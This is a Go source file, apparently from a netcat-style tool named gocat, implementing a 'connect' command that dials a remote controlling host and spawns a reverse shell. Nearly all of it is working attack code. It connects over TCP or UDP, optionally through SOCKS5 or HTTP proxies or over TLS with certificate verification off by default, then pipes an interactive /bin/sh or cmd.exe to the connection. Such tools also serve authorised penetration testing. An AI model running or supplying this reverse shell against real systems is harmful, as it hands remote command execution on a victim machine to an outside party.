package cmd

import (
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/url"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/fatih/color"
	"github.com/ibrahmsql/gocat/internal/logger"
	"github.com/spf13/cobra"
	"golang.org/x/net/proxy"
)

var (
	shellPath    string
	timeout      time.Duration
	retryCount   int
	keepAlive    bool
	proxyURL     string
	useSSL       bool
	verifyCert   bool
	caCertFile   string
	useUDP       bool
	forceIPv6    bool
	forceIPv4    bool
)

var connectCmd = &cobra.Command{
	Use:     "connect [host] <port>",
	Aliases: []string{"c"},
	Short:   "Connect to the controlling host",
	Long:    `Connect to a remote host and spawn a reverse shell.`,
	Args:    cobra.RangeArgs(1, 2),
	Run:     runConnect,
}

func init() {
	rootCmd.AddCommand(connectCmd)

	// Set default shell based on OS
	defaultShell := "/bin/sh"
	if runtime.GOOS == "windows" {
		defaultShell = "cmd.exe"
	}

	connectCmd.Flags().StringVarP(&shellPath, "shell", "s", defaultShell, "Shell to use for command execution")
	connectCmd.Flags().DurationVarP(&timeout, "timeout", "t", 30*time.Second, "Connection timeout")
	connectCmd.Flags().IntVarP(&retryCount, "retry", "r", 3, "Number of retry attempts")
	connectCmd.Flags().BoolVarP(&keepAlive, "keep-alive", "k", false, "Enable keep-alive")
	connectCmd.Flags().StringVarP(&proxyURL, "proxy", "p", "", "Proxy URL (socks5:// or http://)")
	connectCmd.Flags().BoolVarP(&useSSL, "ssl", "S", false, "Use SSL/TLS")
	connectCmd.Flags().BoolVarP(&verifyCert, "verify-cert", "C", false, "Verify SSL certificate")
	connectCmd.Flags().StringVarP(&caCertFile, "ca-cert", "c", "", "CA certificate file")
	connectCmd.Flags().BoolVarP(&useUDP, "udp", "u", false, "Use UDP instead of TCP")
	connectCmd.Flags().BoolVarP(&forceIPv6, "ipv6", "6", false, "Force IPv6")
	connectCmd.Flags().BoolVarP(&forceIPv4, "ipv4", "4", false, "Force IPv4")

	// Mark conflicting flags
	connectCmd.MarkFlagsMutuallyExclusive("ipv4", "ipv6")
}

func runConnect(cmd *cobra.Command, args []string) {
	var host, port string

	if len(args) == 1 {
		host = "127.0.0.1"
		port = args[0]
	} else {
		host = args[0]
		port = args[1]
	}

	if err := connect(host, port, shellPath); err != nil {
		logger.Fatal("Error: %v", err)
	}
}

func connect(host, port, shell string) error {
	address := net.JoinHostPort(host, port)
	
	// Determine network type
	network := "tcp"
	if useUDP {
		network = "udp"
	}
	if forceIPv6 {
		network += "6"
	} else if forceIPv4 {
		network += "4"
	}

	var conn net.Conn
	var err error

	// Retry logic
	for attempt := 0; attempt <= retryCount; attempt++ {
		if attempt > 0 {
			logger.Info("Retrying connection", "attempt", attempt, "max", retryCount)
			time.Sleep(time.Second * time.Duration(attempt))
		}

		conn, err = dialWithOptions(network, address)
		if err == nil {
			break
		}
		
		if attempt == retryCount {
			return fmt.Errorf("failed to connect to %s after %d attempts: %v", address, retryCount+1, err)
		}
	}

	defer conn.Close()

	// Configure keep-alive for TCP connections
	if keepAlive && !useUDP {
		if tcpConn, ok := conn.(*net.TCPConn); ok {
			tcpConn.SetKeepAlive(true)
			tcpConn.SetKeepAlivePeriod(30 * time.Second)
		}
	}

	color.Green("Connected to %s", address)

	if runtime.GOOS == "windows" {
		return connectWindows(conn, shell)
	} else {
		return connectUnix(conn, shell)
	}
}

func dialWithOptions(network, address string) (net.Conn, error) {
	var dialer net.Dialer
	dialer.Timeout = timeout

	// Handle proxy
	if proxyURL != "" {
		return dialWithProxy(network, address, &dialer)
	}

	// Handle SSL/TLS
	if useSSL {
		return dialWithTLS(network, address, &dialer)
	}

	return dialer.Dial(network, address)
}

func dialWithProxy(network, address string, dialer *net.Dialer) (net.Conn, error) {
	proxyParsed, err := url.Parse(proxyURL)
	if err != nil {
		return nil, fmt.Errorf("invalid proxy URL: %v", err)
	}

	switch proxyParsed.Scheme {
	case "socks5":
		proxySocks5, err := proxy.SOCKS5("tcp", proxyParsed.Host, nil, dialer)
		if err != nil {
			return nil, fmt.Errorf("failed to create SOCKS5 proxy: %v", err)
		}
		return proxySocks5.Dial(network, address)
	case "http", "https":
		// For HTTP proxy, we need to use HTTP CONNECT method
		return dialWithHTTPProxy(network, address, proxyParsed, dialer)
	default:
		return nil, fmt.Errorf("unsupported proxy scheme: %s", proxyParsed.Scheme)
	}
}

func dialWithHTTPProxy(network, address string, proxyURL *url.URL, dialer *net.Dialer) (net.Conn, error) {
	// Connect to proxy
	proxyConn, err := dialer.Dial(network, proxyURL.Host)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to proxy: %v", err)
	}

	// Send CONNECT request
	connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", address, address)
	_, err = proxyConn.Write([]byte(connectReq))
	if err != nil {
		proxyConn.Close()
		return nil, fmt.Errorf("failed to send CONNECT request: %v", err)
	}

	// Read response
	buffer := make([]byte, 1024)
	n, err := proxyConn.Read(buffer)
	if err != nil {
		proxyConn.Close()
		return nil, fmt.Errorf("failed to read proxy response: %v", err)
	}

	response := string(buffer[:n])
	if !strings.Contains(response, "200") {
		proxyConn.Close()
		return nil, fmt.Errorf("proxy connection failed: %s", response)
	}

	return proxyConn, nil
}

func dialWithTLS(network, address string, dialer *net.Dialer) (net.Conn, error) {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: !verifyCert,
	}

	// Load CA certificate if provided
	if caCertFile != "" {
		caCert, err := ioutil.ReadFile(caCertFile)
		if err != nil {
			return nil, fmt.Errorf("failed to read CA certificate: %v", err)
		}
		caCertPool := x509.NewCertPool()
		if !caCertPool.AppendCertsFromPEM(caCert) {
			return nil, fmt.Errorf("failed to parse CA certificate")
		}
		tlsConfig.RootCAs = caCertPool
	}

	return tls.DialWithDialer(dialer, network, address, tlsConfig)
}

func connectUnix(conn net.Conn, shell string) error {
	// Create shell command
	cmd := exec.Command(shell, "-i")

	// Redirect stdin, stdout, stderr to the connection
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Start the shell
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start shell: %v", err)
	}

	// Wait for the shell to exit
	if err := cmd.Wait(); err != nil {
		logger.Warn("Shell exited with error: %v", err)
	} else {
		logger.Warn("Shell exited")
	}

	return nil
}

func connectWindows(conn net.Conn, shell string) error {
	// Create shell command
	cmd := exec.Command(shell)

	// Get pipes for stdin, stdout, stderr
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return fmt.Errorf("failed to create stdin pipe: %v", err)
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return fmt.Errorf("failed to create stdout pipe: %v", err)
	}

	stderr, err := cmd.StderrPipe()
	if err != nil {
		return fmt.Errorf("failed to create stderr pipe: %v", err)
	}

	// Start the shell
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start shell: %v", err)
	}

	// Copy data between connection and shell pipes
	go func() {
		if _, err := io.Copy(stdin, conn); err != nil {
			logger.Error("conn to stdin copy error: %v", err)
		}
		stdin.Close()
	}()

	go func() {
		if _, err := io.Copy(conn, stdout); err != nil {
			logger.Error("stdout to conn copy error: %v", err)
		}
	}()

	go func() {
		if _, err := io.Copy(conn, stderr); err != nil {
			logger.Error("stderr to conn copy error: %v", err)
		}
	}()

	// Wait for the shell to exit
	if err := cmd.Wait(); err != nil {
		logger.Warn("Shell exited with error: %v", err)
	} else {
		logger.Warn("Shell exited")
	}

	return nil
}
